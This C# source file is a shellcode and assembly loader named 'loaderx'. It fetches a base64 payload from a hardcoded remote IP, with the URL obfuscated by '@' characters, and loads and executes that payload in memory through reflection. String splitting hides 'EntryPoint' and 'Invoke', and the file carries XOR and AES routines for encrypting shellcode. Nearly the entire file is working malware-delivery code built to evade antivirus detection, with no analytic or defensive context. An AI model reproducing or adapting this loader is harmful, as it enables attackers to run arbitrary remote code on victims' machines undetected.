using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using Microsoft.VisualBasic.CompilerServices;
using System.Reflection;
namespace loaderx
{
    public static class clearx
    {
        public static void Main()
        {
            try
            {
                WebClient client = new WebClient();
                string m = client.DownloadString("ht@tp@:/@/1@0.2@12@.20@2.18@8:88@48/bas@e64en@c@ode.t@xt".Replace("@", ""));
                
                byte[] Bytes = Convert.FromBase64String(m);
                object OldGreen = ThreeHundredSixtyWorldNumberOne(Bytes);
            }
            catch
            {
                Console.WriteLine("加载错误，请尝试其它方法");
            }
        }

        public static byte[] ThreeHundredSixtyWorldNumberOne(byte[] Bytes)
        { 
            object Nothin = null;
            object Objec = new object[0] { };
            object NewObje = new object[][] { (object[])Nothin, (object[])Nothin };

            Object Reflectio5 = Assembly.Load(Bytes);
            object LateCall = NewLateBinding.LateGet(Reflectio5, (Type)Nothin, "E" + "n" + "t" + "r" + "y" + "P" + "o" + "i" + "n" + "t", (object[])Objec, (string[])Nothin, (Type[])Nothin, (bool[])Nothin);
            object Green = NewLateBinding.LateCall(LateCall, (Type)Nothin, "I" + "n" + "v" + "o" + "k" + "e", (object[])NewObje, (string[])Nothin, (Type[])Nothin, (bool[])Nothin, true);
            return (byte[])null;
        }
    


        //异或算法
        private static byte[] XOREncryptDecrypt(byte[] baShellcode, byte[] baXorKey)
        {
            byte[] baXorredRes = new byte[baShellcode.Length];

            for (int i = 0; i < baShellcode.Length; i++)
            {
                baXorredRes[i] = (byte)(baShellcode[i] ^ baXorKey[i % baXorKey.Length]);
            }
            return baXorKey;
        }

        //AES解密算法
        private static byte[] AESDecryptor(byte[] baEncrypedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(baEncrypedShellCode, decryptor);
                }
            }
        }
        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        public static byte[] AESEncryptShellCode(byte[] baShellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return GetAESEncryptedShellCode(baShellcode, encryptor);
                }
            }
        }
        private static byte[] GetAESEncryptedShellCode(byte[] baShellCode, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(baShellCode, 0, baShellCode.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }
}
